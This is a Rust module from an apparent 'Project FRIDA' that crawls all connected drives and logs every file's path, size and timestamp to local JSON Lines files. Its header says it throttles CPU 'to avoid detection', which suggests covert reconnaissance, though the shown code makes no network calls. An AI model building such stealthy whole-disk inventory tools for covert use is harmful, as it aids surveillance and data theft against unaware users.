//! Filesystem crawling module for Project FRIDA
//! 
//! This module is designed to walk the entire filesystem of all connected drives,
//! creating a tree structure of all accessible files and directories. It operates
//! with low CPU overhead to avoid detection and system performance impact.

use serde::{Serialize};
use std::path::{Path, PathBuf};
use std::time::{Duration, UNIX_EPOCH};
use tokio::fs::{self, File};
use tokio::io::{AsyncWriteExt, BufWriter};
use tokio::sync::mpsc;
use tokio::time::sleep;
use async_recursion::async_recursion;

use crate::constants;
use crate::drives::DriveInfo;
use crate::log::Log;

const EXCLUDED_DIRS: &[&str] = &[
    "windows",
    // "program files",
    // "program files (x86)",
    "$recycle.bin",
    "system volume information",
    "recovery",
    // "programdata",
    "perflogs",
    // "appdata",
];

const EXCLUDED_FILES: &[&str] = &["pagefile.sys", "swapfile.sys", "hiberfil.sys"];

/// Represents a file in the filesystem.
#[derive(Serialize, Debug)]
pub struct FileInfo {
    pub name: String,
    pub path: PathBuf,
    pub size: u64,
    pub modified: u64, // Unix timestamp
}

/// Represents a directory in the filesystem.
#[derive(Serialize, Debug)]
pub struct DirectoryInfo {
    pub name: String,
    pub path: PathBuf,
}

/// Represents a node in the filesystem, can be a file or a directory.
#[derive(Serialize, Debug)]
#[serde(tag = "type")]
pub enum FileSystemNode {
    File(FileInfo),
    Directory(DirectoryInfo),
}

/// Checks if a path should be excluded from the crawl.
fn is_excluded_path(path: &Path) -> bool {
    if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
        if EXCLUDED_FILES.contains(&file_name.to_lowercase().as_str()) {
            return true;
        }
    }
    // Check parent directories for exclusion
    if path.is_dir() {
        if let Some(dir_name) = path.file_name().and_then(|n| n.to_str()) {
            if EXCLUDED_DIRS.contains(&dir_name.to_lowercase().as_str()) {
                return true;
            }
        }
    }
    // Check if any component of the path is an excluded directory.
    // This is important for paths like C:\Users\...\AppData\...
    for component in path.components() {
        if let Some(comp_str) = component.as_os_str().to_str() {
            if EXCLUDED_DIRS.contains(&comp_str.to_lowercase().as_str()) {
                return true;
            }
        }
    }
    false
}


/// Recursively walks a directory, sending discovered nodes through a channel.
#[async_recursion]
async fn walk_directory(
    path: PathBuf,
    sender: mpsc::Sender<FileSystemNode>,
) -> Result<(), std::io::Error> {
    if is_excluded_path(&path) {
        Log::info(format!("Skipping excluded path: {}", path.display()));
        return Ok(());
    }

    let mut read_dir = match fs::read_dir(&path).await {
        Ok(entries) => entries,
        Err(e) => {
            Log::error(format!("Could not read directory {}: {}", path.display(), e));
            return Err(e);
        }
    };

    while let Some(entry) = read_dir.next_entry().await? {
        sleep(Duration::from_millis(constants::CRAWLER_CPU_THROTTLE_MS)).await;
        let entry_path = entry.path();

        if is_excluded_path(&entry_path) {
            continue;
        }

        if entry_path.is_dir() {
            let dir_info = DirectoryInfo {
                name: entry.file_name().to_string_lossy().to_string(),
                path: entry_path.clone(),
            };
            if sender.send(FileSystemNode::Directory(dir_info)).await.is_err() {
                return Ok(());
            }
            walk_directory(entry_path, sender.clone()).await?;
        } else if let Ok(metadata) = entry.metadata().await {
            let modified_timestamp = metadata.modified()?
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();

            let file_info = FileInfo {
                name: entry.file_name().to_string_lossy().to_string(),
                path: entry_path,
                size: metadata.len(),
                modified: modified_timestamp,
            };
            if sender.send(FileSystemNode::File(file_info)).await.is_err() {
                // Receiver has been dropped, stop crawling.
                return Ok(());
            }
        }
    }
    Ok(())
}

/// Crawls all provided drives and saves the filesystem tree to a JSON Lines file.
///
/// # Arguments
/// * `drives` - A slice of `DriveInfo` from the `drives` module.
/// * `output_path` - The path to save the resulting JSON Lines file.
pub async fn crawl_drives(drives: &[DriveInfo], output_path_str: &str) -> Result<(), std::io::Error> {
    let (sender, mut receiver) = mpsc::channel(100);
    let output_path = Path::new(output_path_str);
    let output_prefix = output_path.file_stem().unwrap_or_default().to_string_lossy().to_string();
    let output_ext = output_path.extension().unwrap_or_default().to_string_lossy().to_string();
    let output_dir = output_path.parent().unwrap_or_else(|| Path::new(".")).to_path_buf();

    let mut crawl_handles = Vec::new();
    for drive in drives {
        Log::info(format!("Crawling drive: {}", drive.mount_point));
        let drive_path = PathBuf::from(&drive.mount_point);
        let sender_clone = sender.clone();
        let handle = tokio::spawn(async move {
            if let Err(e) = walk_directory(drive_path, sender_clone).await {
                Log::error(format!("Failed to crawl drive: {}", e));
            }
        });
        crawl_handles.push(handle);
    }

    // Drop the original sender to signal that no more tasks will be spawned.
    drop(sender);

    let output_dir_clone = output_dir.to_path_buf();
    let output_prefix_clone = output_prefix.to_string();
    let output_ext_clone = output_ext.to_string();

    let writer_task = tokio::spawn(async move {
        let mut file_index = 0;
        let mut entry_count = 0;
        let mut writer: Option<BufWriter<File>> = None;

        while let Some(node) = receiver.recv().await {
            if writer.is_none() || entry_count >= constants::CRAWLER_MAX_ENTRIES_PER_FILE {
                if let Some(mut w) = writer.take() {
                    let _ = w.flush().await;
                }
                let new_path = output_dir_clone.join(format!(
                    "{}_{}.{}",
                    output_prefix_clone,
                    file_index,
                    output_ext_clone
                ));
                Log::info(format!("Creating new crawl file: {}", new_path.display()));
                let file = File::create(&new_path).await.expect("Failed to create new output file");
                writer = Some(BufWriter::new(file));
                file_index += 1;
                entry_count = 0;
            }

            if let Some(w) = writer.as_mut() {
                if let Ok(json) = serde_json::to_string(&node) {
                    if w.write_all(json.as_bytes()).await.is_err() || w.write_all(b"\n").await.is_err() {
                        break;
                    }
                    entry_count += 1;
                }
            }
        }

        if let Some(mut w) = writer.take() {
            let _ = w.flush().await;
        }
    });

    // Wait for all crawling tasks to complete
    for handle in crawl_handles {
        let _ = handle.await;
    }

    // Wait for the writer task to complete
    let _ = writer_task.await;

    Log::info(format!("Filesystem crawl complete. Output saved to directory: {}", output_dir.display()));
    Ok(())
}
